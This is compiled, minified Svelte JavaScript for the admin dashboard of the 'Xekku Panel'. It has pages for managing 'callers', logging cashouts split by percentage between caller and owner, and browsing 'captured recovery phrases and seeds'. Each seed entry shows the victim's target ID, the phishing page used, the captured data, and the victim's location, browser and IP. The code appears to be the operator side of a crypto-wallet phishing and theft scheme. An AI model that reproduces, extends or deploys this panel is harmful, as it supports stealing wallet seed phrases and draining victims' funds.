placeholder="Enter caller's percentage" class="svelte-1j1h1qn"/> <span class="percentage-symbol svelte-1j1h1qn">%</span></div></div> <div class="split-preview svelte-1j1h1qn"><h3 class="svelte-1j1h1qn"><span class="material-icons">calculate</span> Split Preview</h3> <div class="split-amounts svelte-1j1h1qn"><div class="amount-row caller svelte-1j1h1qn"><div class="amount-info svelte-1j1h1qn"><span class="label svelte-1j1h1qn">Caller's Amount</span> <span class="percentage svelte-1j1h1qn"> </span></div> <span class="amount svelte-1j1h1qn"> </span></div> <div class="amount-row owner svelte-1j1h1qn"><div class="amount-info svelte-1j1h1qn"><span class="label svelte-1j1h1qn">Your Amount</span> <span class="percentage svelte-1j1h1qn"> </span></div> <span class="amount svelte-1j1h1qn"> </span></div> <div class="amount-row total svelte-1j1h1qn"><span class="label svelte-1j1h1qn">Total Amount</span> <span class="amount svelte-1j1h1qn"> </span></div></div></div> <div class="modal-actions svelte-1j1h1qn"><button type="button" class="secondary svelte-1j1h1qn">Cancel</button> <button type="submit" class="primary svelte-1j1h1qn"><span class="material-icons">payments</span> Register Cashout</button></div></form></div></div>`),vs=S('<div class="cashout-details svelte-1j1h1qn"><p class="svelte-1j1h1qn"> </p> <p class="svelte-1j1h1qn"> </p> <p class="svelte-1j1h1qn"> </p></div>'),ds=S('<div class="modal-backdrop svelte-1j1h1qn" role="button" tabindex="0"><div class="modal delete-modal svelte-1j1h1qn" role="button" tabindex="0"><div class="modal-header delete svelte-1j1h1qn"><h2 class="svelte-1j1h1qn"><span class="material-icons">warning</span> Confirm Delete</h2> <button class="close-modal svelte-1j1h1qn"><span class="material-icons">close</span></button></div> <div class="delete-content svelte-1j1h1qn"><p>Are you sure you want to delete this cashout?</p> <!> <p class="warning svelte-1j1h1qn"><span class="material-icons">info</span> This action cannot be undone.</p></div> <div class="modal-actions svelte-1j1h1qn"><button class="secondary svelte-1j1h1qn">Cancel</button> <button class="danger svelte-1j1h1qn"><span class="material-icons">delete</span> Delete Cashout</button></div></div></div>'),us=S('<div class="modal-backdrop svelte-1j1h1qn" role="button" tabindex="0"><div class="modal status-modal svelte-1j1h1qn" role="button" tabindex="0"><div class="modal-header svelte-1j1h1qn"><h2 class="svelte-1j1h1qn"><span class="material-icons">update</span> Update Status</h2> <button class="close-modal svelte-1j1h1qn"><span class="material-icons">close</span></button></div> <div class="status-content svelte-1j1h1qn"><div class="cashout-details svelte-1j1h1qn"><p class="svelte-1j1h1qn"><span class="label svelte-1j1h1qn">Caller:</span> </p> <p class="svelte-1j1h1qn"><span class="label svelte-1j1h1qn">Amount:</span> </p> <p class="svelte-1j1h1qn"><span class="label svelte-1j1h1qn">Current Status:</span> <span><span class="material-icons"><!></span> </span></p></div> <div class="form-group svelte-1j1h1qn"><label for="newStatus" class="svelte-1j1h1qn">New Status</label> <div class="status-options svelte-1j1h1qn"><button type="button"><span class="material-icons">schedule</span> Pending</button> <button type="button"><span class="material-icons">check_circle</span> Completed</button> <button type="button"><span class="material-icons">error</span> Rejected</button></div></div></div> <div class="modal-actions svelte-1j1h1qn"><button class="secondary svelte-1j1h1qn">Cancel</button> <button class="primary svelte-1j1h1qn"><span class="material-icons">save</span> Update Status</button></div></div></div>'),ps=S('<div class="cashouts-container svelte-1j1h1qn"><div class="intro"><div class="header-content svelte-1j1h1qn"><div class="title-section svelte-1j1h1qn"><h1 class="svelte-1j1h1qn">Cashouts</h1> <p class="svelte-1j1h1qn">Manage caller cashouts</p></div> <div class="search-box svelte-1j1h1qn"><span class="material-icons search-icon svelte-1j1h1qn">search</span> <input type="text" placeholder="Search cashouts..." class="svelte-1j1h1qn"/></div></div></div> <!> <div class="actions svelte-1j1h1qn"><button class="add-btn svelte-1j1h1qn"><span class="material-icons">add</span> Register Cashout</button></div> <!></div> <!> <!> <!>',1);function _s(xe,U){at(U,!1);const G=g();let H=ct(U,"guild",8),F=g([]),Z=g([]),B=g(!0),z=g(null),K=g(""),W=g(!1),V=g(!1),v=g(null),f=g(!1),ae=g("pending"),w=g({username:"",totalAmount:0,percentage_cut:20,amount:0,status:"pending"});function _e(i,r){return Number((i*(r/100)).toFixed(2))}async function Re(){try{const r=await(await fetch("/api/guild/getGuildCallers",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({guild:H()})})).json();r.success&&l(Z,r.users)}catch(i){console.error("Error fetching callers:",i)}}async function P(){try{const r=await(await fetch(`/api/guild/getCashouts?guild=${H()}`)).json();r.success?l(F,r.cashouts):l(z,r.error),l(B,!1)}catch(i){l(z,"Failed to fetch cashouts"),console.error(i),l(B,!1)}}async function $(){try{(await fetch("/api/guild/registerCashout",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({...e(w),date_registered:new Date().toISOString(),guild:H()})})).ok?(l(W,!1),l(w,{username:"",totalAmount:0,percentage_cut:20,amount:0,status:"pending"}),await P()):l(z,"Failed to register cashout")}catch(i){l(z,"Error registering cashout"),console.error(i)}}function oe(i){l(v,i),l(V,!0)}async function ie(){if(e(v))try{(await fetch("/api/guild/deleteCashout",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({id:e(v).id,guild:H()})})).ok?(l(V,!1),l(v,null),await P()):l(z,"Failed to delete cashout")}catch(i){l(z,"Error deleting cashout"),console.error(i)}}async function ce(i,r){try{(await fetch("/api/guild/updateCashout",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({id:i.id,guild:H(),status:r})})).ok?(l(f,!1),l(v,null),await P()):l(z,"Failed to update cashout status")}catch(d){l(z,"Error updating cashout status"),console.error(d)}}st(()=>{P(),Re()}),Xe(()=>e(w),()=>{Pe(w,e(w).amount=e(w).totalAmount)}),Xe(()=>(e(F),e(K)),()=>{l(G,e(F).filter(i=>i.username.toLowerCase().includes(e(K).toLowerCase())||i.status.toLowerCase().includes(e(K).toLowerCase())))}),ut(),ot();var me=ps(),ve=Ee(me),ge=s(ve),we=s(ge),Te=a(s(we),2),ye=a(s(Te),2);Se(ye),t(Te),t(we),t(ge);var A=a(ge,2);{var Q=i=>{var r=ls(),d=a(s(r),2),b=s(d,!0);t(d);var x=a(d,2);t(r),ee(()=>h(b,e(z))),c("click",x,()=>l(z,null)),I(3,r,()=>He),m(i,r)};E(A,i=>{e(z)&&i(Q)})}var re=a(A,2),Le=s(re);t(re);var je=a(re,2);{var Ie=i=>{var r=ns();m(i,r)},Me=i=>{var r=rs(),d=s(r),b=a(s(d));Ke(b,5,()=>e(G),Qe,(x,_)=>{var y=is(),D=s(y),M=s(D,!0);t(D);var O=a(D),j=s(O,!0);t(O);var k=a(O),J=s(k);t(k);var T=a(k),te=s(T,!0);t(T);var R=a(T),le=s(R),q=s(le),Y=s(q);{var N=ue=>{var qe=Ve("check_circle");m(ue,qe)},ke=ue=>{var qe=et(),Ae=Ee(qe);{var pe=Ce=>{var Ne=Ve("schedule");m(Ce,Ne)},se=Ce=>{var Ne=Ve("error");m(Ce,Ne)};E(Ae,Ce=>{e(_),p(()=>e(_).status==="pending")?Ce(pe):Ce(se,!1)},!0)}m(ue,qe)};E(Y,ue=>{e(_),p(()=>e(_).status==="completed")?ue(N):ue(ke,!1)})}t(q);var de=a(q);t(le),t(R);var be=a(R),ne=s(be),C=s(ne),fe=a(C,2);t(ne),t(be),t(y),ee((ue,qe,Ae,pe)=>{h(M,(e(_),p(()=>e(_).id))),h(j,(e(_),p(()=>e(_).username))),h(J,`$${ue??""}`),h(te,qe),De(le,1,`status-badge ${Ae??""}`,"svelte-1j1h1qn"),h(de,` ${e(_),p(()=>e(_).status)??""}`),De(C,1,`status-btn ${pe??""}`,"svelte-1j1h1qn")},[()=>(e(_),p(()=>_e(e(_).amount,e(_).percentage_cut).toLocaleString())),()=>(e(_),p(()=>new Date(e(_).date_registered).toLocaleDateString())),()=>(e(_),p(()=>e(_).status.toLowerCase())),()=>(e(_),p(()=>e(_).status.toLowerCase()))]),c("click",C,()=>{l(v,e(_)),l(f,!0)}),c("click",fe,()=>oe(e(_))),I(3,y,()=>He),m(x,y)}),t(b),t(d),t(r),I(3,r,()=>ze),m(i,r)};E(je,i=>{e(B)?i(Ie):i(Me,!1)})}t(ve);var Ue=a(ve,2);{var X=i=>{var r=cs(),d=s(r),b=s(d),x=a(s(b),2);t(b);var _=a(b,2),y=s(_),D=a(s(y),2);ee(()=>{e(w),dt(()=>{e(Z)})});var M=s(D);M.value=M.__value="";var O=a(M);Ke(O,1,()=>e(Z),Qe,(he,$e)=>{var Je=os(),nt=s(Je,!0);t(Je);var it={};ee(()=>{h(nt,(e($e),p(()=>e($e).username))),it!==(it=(e($e),p(()=>e($e).username)))&&(Je.value=(Je.__value=(e($e),p(()=>e($e).username)))??"")}),m(he,Je)}),t(D),t(y);var j=a(y,2),k=a(s(j),2),J=a(s(k),2);Se(J),t(k),t(j);var T=a(j,2),te=a(s(T),2),R=s(te);Se(R),Fe(2),t(te),t(T);var le=a(T,2),q=a(s(le),2),Y=s(q),N=s(Y),ke=a(s(N),2),de=s(ke);t(ke),t(N);var be=a(N,2),ne=s(be);t(be),t(Y);var C=a(Y,2),fe=s(C),ue=a(s(fe),2),qe=s(ue);t(ue),t(fe);var Ae=a(fe,2),pe=s(Ae);t(Ae),t(C);var se=a(C,2),Ce=a(s(se),2),Ne=s(Ce);t(Ce),t(se),t(q),t(le);var Be=a(le,2),Ge=s(Be);Fe(2),t(Be),t(_),t(d),t(r),ee((he,$e,Je,nt)=>{h(de,`(${e(w),p(()=>e(w).percentage_cut)??""}%)`),h(ne,`$${he??""}`),h(qe,`(${$e??""}%)`),h(pe,`$${Je??""}`),h(Ne,`$${nt??""}`)},[()=>(e(w),p(()=>_e(e(w).totalAmount,e(w).percentage_cut).toLocaleString("en-US",{minimumFractionDigits:2,maximumFractionDigits:2}))),()=>(e(w),p(()=>(100-e(w).percentage_cut).toFixed(2))),()=>(e(w),p(()=>(e(w).totalAmount-_e(e(w).totalAmount,e(w).percentage_cut)).toLocaleString("en-US",{minimumFractionDigits:2,maximumFractionDigits:2}))),()=>(e(w),p(()=>e(w).totalAmount.toLocaleString("en-US",{minimumFractionDigits:2,maximumFractionDigits:2})))]),c("click",x,()=>l(W,!1)),ht(D,()=>e(w).username,he=>Pe(w,e(w).username=he)),Oe(J,()=>e(w).totalAmount,he=>Pe(w,e(w).totalAmount=he)),Oe(R,()=>e(w).percentage_cut,he=>Pe(w,e(w).percentage_cut=he)),c("click",Ge,()=>l(W,!1)),c("submit",_,At($)),I(3,d,()=>Ye),c("click",d,We(function(he){Ze.call(this,U,he)})),c("keydown",d,()=>{}),I(3,r,()=>ze),c("click",r,()=>l(W,!1)),c("keydown",r,()=>{}),m(i,r)};E(Ue,i=>{e(W)&&i(X)})}var L=a(Ue,2);{var u=i=>{var r=ds(),d=s(r),b=s(d),x=a(s(b),2);t(b);var _=a(b,2),y=a(s(_),2);{var D=k=>{var J=vs(),T=s(J),te=s(T);t(T);var R=a(T,2),le=s(R);t(R);var q=a(R,2),Y=s(q);t(q),t(J),ee(N=>{h(te,`Caller: ${e(v),p(()=>e(v).username)??""}`),h(le,`Amount: $${e(v),p(()=>e(v).amount)??""}`),h(Y,`Date: ${N??""}`)},[()=>(e(v),p(()=>new Date(e(v).date_registered).toLocaleDateString()))]),m(k,J)};E(y,k=>{e(v)&&k(D)})}Fe(2),t(_);var M=a(_,2),O=s(M),j=a(O,2);t(M),t(d),t(r),c("click",x,()=>l(V,!1)),c("click",O,()=>l(V,!1)),c("click",j,ie),I(3,d,()=>Ye),c("click",d,We(function(k){Ze.call(this,U,k)})),c("keydown",d,()=>{}),I(3,r,()=>ze),c("click",r,()=>l(V,!1)),c("keydown",r,()=>{}),m(i,r)};E(L,i=>{e(V)&&i(u)})}var n=a(L,2);{var o=i=>{var r=us(),d=s(r),b=s(d),x=a(s(b),2);t(b);var _=a(b,2),y=s(_),D=s(y),M=a(s(D));t(D);var O=a(D,2),j=a(s(O));t(O);var k=a(O,2),J=a(s(k),2),T=s(J),te=s(T);{var R=pe=>{var se=Ve("check_circle");m(pe,se)},le=pe=>{var se=et(),Ce=Ee(se);{var Ne=Ge=>{var he=Ve("schedule");m(Ge,he)},Be=Ge=>{var he=Ve("error");m(Ge,he)};E(Ce,Ge=>{e(v),p(()=>e(v).status==="pending")?Ge(Ne):Ge(Be,!1)},!0)}m(pe,se)};E(te,pe=>{e(v),p(()=>e(v).status==="completed")?pe(R):pe(le,!1)})}t(T);var q=a(T);t(J),t(k),t(y);var Y=a(y,2),N=a(s(Y),2),ke=s(N);let de;var be=a(ke,2);let ne;var C=a(be,2);let fe;t(N),t(Y),t(_);var ue=a(_,2),qe=s(ue),Ae=a(qe,2);t(ue),t(d),t(r),ee((pe,se,Ce,Ne,Be)=>{h(M,` ${e(v),p(()=>e(v).username)??""}`),h(j,` $${pe??""}`),De(J,1,`status-badge ${se??""}`,"svelte-1j1h1qn"),h(q,` ${e(v),p(()=>e(v).status)??""}`),de=De(ke,1,"status-option pending svelte-1j1h1qn",null,de,Ce),ne=De(be,1,"status-option completed svelte-1j1h1qn",null,ne,Ne),fe=De(C,1,"status-option rejected svelte-1j1h1qn",null,fe,Be)},[()=>(e(v),p(()=>_e(e(v).amount,e(v).percentage_cut).toLocaleString())),()=>(e(v),p(()=>e(v).status.toLowerCase())),()=>({active:e(ae)==="pending"}),()=>({active:e(ae)==="completed"}),()=>({active:e(ae)==="rejected"})]),c("click",x,()=>l(f,!1)),c("click",ke,()=>l(ae,"pending")),c("click",be,()=>l(ae,"completed")),c("click",C,()=>l(ae,"rejected")),c("click",qe,()=>l(f,!1)),c("click",Ae,()=>{e(v)&&ce(e(v),e(ae))}),I(3,d,()=>Ye),c("click",d,We(function(pe){Ze.call(this,U,pe)})),c("keydown",d,()=>{}),I(3,r,()=>ze),c("click",r,()=>l(f,!1)),c("keydown",r,()=>{}),m(i,r)};E(n,i=>{e(f)&&e(v)&&i(o)})}Oe(ye,()=>e(K),i=>l(K,i)),c("click",Le,()=>l(W,!0)),m(xe,me),lt()}var ms=S('<div class="error-message svelte-5flsoj"><span class="material-icons">error_outline</span> <p> </p> <button class="close-error svelte-5flsoj"><span class="material-icons">close</span></button></div>'),bs=S('<div class="loading svelte-5flsoj"><div class="loader svelte-5flsoj"></div> <span>Loading seeds...</span></div>'),hs=S('<span class="caller"> </span>'),gs=S('<div class="detail svelte-5flsoj"><span class="material-icons">public</span> <span> </span></div> <div class="detail svelte-5flsoj"><span class="material-icons">computer</span> <span> </span></div> <div class="detail svelte-5flsoj"><span class="material-icons">wifi</span> <span> </span></div>',1),fs=S('<div class="seed-card svelte-5flsoj"><div class="seed-header svelte-5flsoj"><div class="target-info svelte-5flsoj"><span class="material-icons">person</span> <span class="target-id"> </span></div> <div class="caller-info svelte-5flsoj"><!></div></div> <div class="seed-content svelte-5flsoj"><div class="page-info svelte-5flsoj"><span class="material-icons"><!></span> <span class="page-name"> </span></div> <div class="seed-data svelte-5flsoj"><p class="label svelte-5flsoj">Captured Data:</p> <div class="data-box svelte-5flsoj"> </div></div> <div class="target-details svelte-5flsoj"><!></div></div></div>'),ws=S("<button> </button>"),ys=S('<div class="seeds-grid svelte-5flsoj"></div> <div class="pagination svelte-5flsoj"><button class="page-btn svelte-5flsoj"><span class="material-icons">chevron_left</span></button> <!> <button class="page-btn svelte-5flsoj"><span class="material-icons">chevron_right</span></button></div>',1),js=S('<div class="seeds-container svelte-5flsoj"><div class="intro"><div class="header-content svelte-5flsoj"><div class="title-section svelte-5flsoj"><h1 class="svelte-5flsoj">Captured Seeds</h1> <p class="svelte-5flsoj">View all captured recovery phrases and seeds</p></div> <div class="search-box svelte-5flsoj"><span class="material-icons search-icon svelte-5flsoj">search</span> <input type="text" placeholder="Search seeds or target IDs..." class="svelte-5flsoj"/></div></div></div> <!> <!></div>');function ks(xe,U){at(U,!1);const G=g(),H=g(),F=g(),Z=g();let B=ct(U,"guild",8),z=g([]),K=g([]),W=g(!0),V=g(null),v=g(""),f=g(1);const ae=5;function w(){e(f)<e(H)&&wt(f)}function _e(){e(f)>1&&wt(f,-1)}function Re(A){A>=1&&A<=e(H)&&l(f,A)}async function P(){try{const Q=await(await fetch(`/api/guild/getCallerTargets?guild=${B()}`)).json();if(Q.success){l(z,Q.targets);const Le=await(await fetch("/api/guild/getCapturedSeeds",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({guild:B(),targetIds:e(z).map(je=>je.id)})})).json();Le.success&&l(K,Le.seeds)}l(W,!1)}catch(A){l(V,"Failed to fetch seeds"),console.error(A),l(W,!1)}}st(()=>{P()}),Xe(()=>(e(K),e(v)),()=>{l(G,e(K).filter(A=>A.captureddata.toLowerCase().includes(e(v).toLowerCase())||A.targetid.toLowerCase().includes(e(v).toLowerCase())))}),Xe(()=>e(G),()=>{l(H,Math.ceil(e(G).length/ae))}),Xe(()=>(e(G),e(f)),()=>{l(F,e(G).slice((e(f)-1)*ae,e(f)*ae))}),Xe(()=>e(H),()=>{l(Z,Array.from({length:e(H)},(A,Q)=>Q+1))}),ut(),ot();var $=js(),oe=s($),ie=s(oe),ce=a(s(ie),2),me=a(s(ce),2);Se(me),t(ce),t(ie),t(oe);var ve=a(oe,2);{var ge=A=>{var Q=ms(),re=a(s(Q),2),Le=s(re,!0);t(re);var je=a(re,2);t(Q),ee(()=>h(Le,e(V))),c("click",je,()=>l(V,null)),I(3,Q,()=>He),m(A,Q)};E(ve,A=>{e(V)&&A(ge)})}var we=a(ve,2);{var Te=A=>{var Q=bs();m(A,Q)},ye=A=>{var Q=ys(),re=Ee(Q);Ke(re,5,()=>e(F),Qe,(Ue,X)=>{var L=fs(),u=s(L),n=s(u),o=a(s(n),2),i=s(o);t(o),t(n);var r=a(n,2),d=s(r);{var b=Y=>{var N=hs(),ke=s(N,!0);t(N),ee(de=>h(ke,de),[()=>(e(z),e(X),p(()=>{var de;return(de=e(z).find(be=>be.id===e(X).targetid))==null?void 0:de.belongsto}))]),m(Y,N)};E(d,Y=>{e(z),e(X),p(()=>e(z).find(N=>N.id===e(X).targetid))&&Y(b)})}t(r),t(u);var x=a(u,2),_=s(x),y=s(_),D=s(y);{var M=Y=>{var N=Ve("vpn_key");m(Y,N)},O=Y=>{var N=et(),ke=Ee(N);{var de=ne=>{var C=Ve("link_off");m(ne,C)},be=ne=>{var C=Ve("description");m(ne,C)};E(ke,ne=>{e(X),p(()=>e(X).page.includes("disconnect"))?ne(de):ne(be,!1)},!0)}m(Y,N)};E(D,Y=>{e(X),p(()=>e(X).page==="import_seed")?Y(M):Y(O,!1)})}t(y);var j=a(y,2),k=s(j,!0);t(j),t(_);var J=a(_,2),T=a(s(J),2),te=s(T,!0);t(T),t(J);var R=a(J,2),le=s(R);{var q=Y=>{const N=Tt(()=>(e(z),e(X),p(()=>e(z).find(se=>se.id===e(X).targetid))));var ke=gs(),de=Ee(ke),be=a(s(de),2),ne=s(be,!0);t(be),t(de);var C=a(de,2),fe=a(s(C),2),ue=s(fe,!0);t(fe),t(C);var qe=a(C,2),Ae=a(s(qe),2),pe=s(Ae,!0);t(Ae),t(qe),ee(()=>{h(ne,(rt(e(N)),p(()=>{var se;return((se=e(N))==null?void 0:se.location)||"Unknown"}))),h(ue,(rt(e(N)),p(()=>{var se;return((se=e(N))==null?void 0:se.browser)||"Unknown"}))),h(pe,(rt(e(N)),p(()=>{var se;return(se=e(N))==null?void 0:se.ip})))}),m(Y,ke)};E(le,Y=>{e(z),e(X),p(()=>e(z).find(N=>N.id===e(X).targetid))&&Y(q)})}t(R),t(x),t(L),ee(()=>{h(i,`Target: ${e(X),p(()=>e(X).targetid)??""}`),h(k,(e(X),p(()=>e(X).page))),h(te,(e(X),p(()=>e(X).captureddata)))}),I(3,L,()=>He),m(Ue,L)}),t(re);var Le=a(re,2),je=s(Le),Ie=a(je,2);Ke(Ie,1,()=>e(Z),Qe,(Ue,X)=>{var L=ws(),u=s(L,!0);t(L),ee(()=>{De(L,1,`page-btn ${e(f)===e(X)?"active":""}`,"svelte-5flsoj"),h(u,e(X))}),c("click",L,()=>Re(e(X))),m(Ue,L)});var Me=a(Ie,2);t(Le),ee(()=>{je.disabled=e(f)===1,Me.disabled=e(f)===e(H)}),I(3,re,()=>ze),c("click",je,_e),c("click",Me,w),m(A,Q)};E(we,A=>{e(W)?A(Te):A(ye,!1)})}t($),Oe(me,()=>e(v),A=>l(v,A)),m(xe,$),lt()}function xs(){gt("/logout")}var qs=S('<div><div class="loadingLogo svelte-169czl3"><img alt="Logo" class="svelte-169czl3"/> <div class="loading-text svelte-169czl3"><h1 class="svelte-169czl3">Xekku Panel<span class="accent svelte-169czl3">.</span></h1> <p class="admin-badge svelte-169czl3">ADMIN PANEL</p></div></div></div>'),Cs=(xe,U)=>U("Statistics"),Ss=(xe,U)=>U("Callers"),Ds=(xe,U)=>U("Seeds"),Ts=(xe,U)=>U("Cashouts"),Ls=(xe,U)=>U("Settings"),As=S('<!> <div class="dashboard-container svelte-169czl3"><div class="sidebar svelte-169czl3"><div class="logo-section svelte-169czl3"><img alt="Logo" class="svelte-169czl3"/> <div class="brand svelte-169czl3"><h1 class="svelte-169czl3">Xekku Panel<span class="accent svelte-169czl3">.</span></h1> <div class="admin-tag svelte-169czl3">ADMIN</div></div></div> <div class="navigation-section svelte-169czl3"><div class="nav-group svelte-169czl3"><h3 class="svelte-169czl3"><span class="material-icons svelte-169czl3">dashboard</span> Control Panel</h3> <div class="nav-items svelte-169czl3"><button><span class="material-icons svelte-169czl3">analytics</span> Statistics</button> <button><span class="material-icons svelte-169czl3">groups</span> Callers</button> <button><span class="material-icons svelte-169czl3">key</span> Seeds</button> <button><span class="material-icons svelte-169czl3">payments</span> Cashouts</button></div></div> <div class="nav-group svelte-169czl3"><h3 class="svelte-169czl3"><span class="material-icons svelte-169czl3">admin_panel_settings</span> Administration</h3> <div class="nav-items svelte-169czl3"><button><span class="material-icons svelte-169czl3">settings</span> Settings</button> <button class="nav-item logout svelte-169czl3"><span class="material-icons svelte-169czl3">logout</span> Logout</button></div></div></div></div> <main class="content-area svelte-169czl3"><div class="content-container svelte-169czl3"><!></div></main></div>',1);function Ms(xe,U){at(U,!0);let G=vt("Overview"),H,F=vt("Guest"),Z=vt(""),B=vt(!0);async function z(L){try{const u=await fetch(`/admin/api/getGuild?username=${L}`),n=await u.json();u.ok?l(Z,n.guild,!0):console.error("Error fetching guild:",n.error)}catch(u){console.error("Error fetching guild:",u)}}function K(L){l(G,L,!0)}st(()=>{if(H=localStorage.getItem("authTokenAdmin"),H)try{const L=Ot(H);console.error("man: ",L),l(F,L.userName,!0),z(e(F))}catch(L){console.error("Error decoding token:",L),gt("login")}else gt("login");setTimeout(()=>{l(G,"lol"),l(G,"Overview"),l(B,!1)},2e3)});var W=As(),V=Ee(W);{var v=L=>{var u=qs(),n=s(u),o=s(n);Fe(2),t(n),t(u),ee(()=>{De(u,1,`loading-screen ${e(B)?"":"hidden"}`,"svelte-169czl3"),tt(o,"src",yt)}),I(3,u,()=>ze),m(L,u)};E(V,L=>{e(B)&&L(v)})}var f=a(V,2),ae=s(f),w=s(ae),_e=s(w);Fe(2),t(w);var Re=a(w,2),P=s(Re),$=a(s(P),2),oe=s($);let ie;oe.__click=[Cs,K];var ce=a(oe,2);let me;ce.__click=[Ss,K];var ve=a(ce,2);let ge;ve.__click=[Ds,K];var we=a(ve,2);let Te;we.__click=[Ts,K],t($),t(P);var ye=a(P,2),A=a(s(ye),2),Q=s(A);let re;Q.__click=[Ls,K];var Le=a(Q,2);Le.__click=[xs],t(A),t(ye),t(Re),t(ae);var je=a(ae,2),Ie=s(je),Me=s(Ie);{var Ue=L=>{$t(L,{get guild(){return e(Z)}})},X=L=>{var u=et(),n=Ee(u);{var o=r=>{Wt(r,{get guild(){return e(Z)}})},i=r=>{var d=et(),b=Ee(d);{var x=y=>{as(y,{get guild(){return e(Z)}})},_=y=>{var D=et(),M=Ee(D);{var O=k=>{_s(k,{get guild(){return e(Z)}})},j=k=>{var J=et(),T=Ee(J);{var te=R=>{ks(R,{get guild(){return e(Z)}})};E(T,R=>{e(G)==="Seeds"&&R(te)},!0)}m(k,J)};E(M,k=>{e(G)==="Cashouts"?k(O):k(j,!1)},!0)}m(y,D)};E(b,y=>{e(G)==="Settings"?y(x):y(_,!1)},!0)}m(r,d)};E(n,r=>{e(G)==="Callers"?r(o):r(i,!1)},!0)}m(L,u)};E(Me,L=>{e(G)==="Statistics"?L(Ue):L(X,!1)})}t(Ie),t(je),t(f),ee((L,u,n,o,i)=>{tt(_e,"src",yt),ie=De(oe,1,"nav-item svelte-169czl3",null,ie,L),me=De(ce,1,"nav-item svelte-169czl3",null,me,u),ge=De(ve,1,"nav-item svelte-169czl3",null,ge,n),Te=De(we,1,"nav-item svelte-169czl3",null,Te,o),re=De(Q,1,"nav-item svelte-169czl3",null,re,i)},[()=>({active:e(G)==="Statistics"}),()=>({active:e(G)==="Callers"}),()=>({active:e(G)==="Seeds"}),()=>({active:e(G)==="Cashouts"}),()=>({active:e(G)==="Settings"})]),I(1,Ie,()=>ze),m(xe,W),lt()}Dt(["click"]);export{Ms as component};
